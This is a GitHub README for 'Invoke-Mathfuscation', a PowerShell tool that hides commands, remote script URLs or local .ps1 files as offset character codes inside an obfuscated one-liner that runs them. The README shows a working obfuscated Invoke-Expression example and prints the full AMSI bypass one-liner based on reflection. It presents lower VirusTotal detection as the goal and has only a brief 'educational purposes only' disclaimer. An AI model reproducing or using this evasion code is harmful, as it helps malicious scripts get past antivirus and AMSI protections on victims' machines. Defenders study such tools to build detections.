# Invoke-Mathfuscation

![alt text](https://raw.githubusercontent.com/bobby-tablez/Invoke-Mathfuscation/main/mathfuscation.png)

A quick command line utility that converts individual characters of an input string into char values. It then takes a user-supplied number value and uses it to ofuscate the individual char values. Lastly, it outputs a simple obfuscated one-liner using random polymorphic variables which will execute the original string. Currently supports:

* Remote URL (ie: http://example.com/dir/remote.ps1)
* Local File (ie: C:\tmp\local.ps1)
* PowerShell Command

When prompted, specify a command to invoke, remote URL or full local path to a .ps1 file, then supply the number offset which will be added to the char values. 

Example: 
```Write-Host "Hello world!"``` using 600 as an offset:
```powershell
@(687,714,705,716,701,645,672,711,715,716,632,634,672,701,708,708,711,632,719,711,714,708,700,633,634)|%{$Pbdli=$Pbdli+[char]($_-600)};.(g`cm i?[?x])($Pbdli)
```

# VirusTotal Detections

Example: AMSI Bypass using Using Matt Graebers Reflection method:

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Unmathfuscated:
![alt text](https://raw.githubusercontent.com/bobby-tablez/Invoke-Mathfuscation/main/mathfuscate_amsi_bypass_1.png)

Mathfuscated:
![alt text](https://raw.githubusercontent.com/bobby-tablez/Invoke-Mathfuscation/main/mathfuscate_amsi_bypass_2.png)



*Disclaimer: I'm not a programmer*

Use at your own risk! For educational purposes only. 


